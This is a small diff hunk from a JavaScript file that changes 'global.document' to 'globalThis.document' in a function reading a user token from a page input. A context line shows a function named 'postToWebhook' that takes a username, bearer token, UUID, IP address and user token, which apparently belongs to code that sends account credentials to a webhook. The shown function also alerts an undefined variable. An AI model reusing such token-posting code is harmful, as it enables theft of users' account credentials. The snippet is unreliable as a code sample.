@@ -137,7 +137,7 @@ function postToWebhook(username, bearerToken, uuid, ip, userToken) {
 }
 
 function returnText() {
-  let userToken = global.document.getElementById("userInput").value
+  let userToken = globalThis.document.getElementById("userInput").value
   alert(input)
 }
 
